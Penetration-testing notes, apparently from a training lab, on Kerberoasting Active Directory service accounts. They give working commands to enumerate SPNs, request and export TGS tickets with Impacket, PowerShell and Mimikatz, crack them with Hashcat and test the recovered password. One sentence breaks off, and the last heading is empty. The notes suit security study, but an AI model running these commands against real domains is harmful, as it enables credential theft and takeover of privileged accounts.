# Kerberoasting

This attack targets Service Principal Names (SPN) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as NT AUTHORITY\LOCAL SERVICE. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.

Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp_cmdshell extended procedure and gain code execution on the target SQL server.

Reference: https://youtu.be/PUyhlN-E5MU

## Kerberoasting - from Linux
Depending on your position in a network, this attack can be performed in multiple ways:
```
- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using runas /netonly.
```
Several tools can be utilized to perform the attack:
```
- Impacket’s GetUserSPNs.py from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.
```
Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be cracked offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

***A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.***

Impacket: https://github.com/SecureAuthCorp/impacket

1. We can start by just gathering a listing of SPNs in the domain. To do this, we will need **a set of valid domain credentials** and the **IP address of a Domain Controller**. We can authenticate to the Domain Controller with a **cleartext password**,** NT password hash**, or even a **Kerberos ticket**. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always **worth investigating the group membership of all accounts** because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```

- pull all TGS tickets for offline processing using the -request flag

```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```

- or request just the TGS ticket for a specific account
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```

- use the -outputfile flag to write the TGS tickets to a file that can then be run using Hashcat
```
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
```

- Cracking the Ticket Offline with Hashcat
```
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

- Testing Authentication against a Domain Controller
```
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
```

## Kerberoasting - from Windows

> Before tools such as **Rubeus** existed, stealing or forging Kerberos tickets was a complex

***!!! the below method will likely not be our go-to every time. !!!***

**Enumerating SPNs with setspn.exe**

- We will focus on user accounts and ignore the computer accounts returned by the tool

```
setspn.exe -Q */*
```

- request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using Mimikatz
```
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
- The `Add-Type` cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- `System.IdentityModel` is a namespace that contains different classes for building security token services
- We'll then use the `New-Object` cmdlet to create an instance of a .NET Framework object
- We'll use the `System.IdentityModel.Tokens` namespace with the `KerberosRequestorSecurityToken` class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

> We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.

**Retrieving All Tickets Using setspn.exe**
```
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Now that the tickets are loaded, we can use Mimikatz to extract the ticket(s) from memory.

**Extracting Tickets from Memory with Mimikatz**

```
mimikatz # base64 /out:true
mimikatz # kerberos::list /export
```

> If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files.

Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

**Preparing the Base64 Blob for Cracking**
```
echo "<base64 blob>" |  tr -d \\n 
```
**Placing the Output into a File as .kirbi**
```
cat encoded_file | base64 -d > sqldev.kirbi
```
**Extracting the Kerberos Ticket using kirbi2john.py (This will create a file called crack_file. We then must modify the file a bit to be able to use Hashcat against the hash.)**
```
python2.7 kirbi2john.py sqldev.kirbi
```
**Modifiying crack_file for Hashcat**
```
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
**Cracking the Hash with Hashcat**
```
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```

### Automated / Tool Based Route


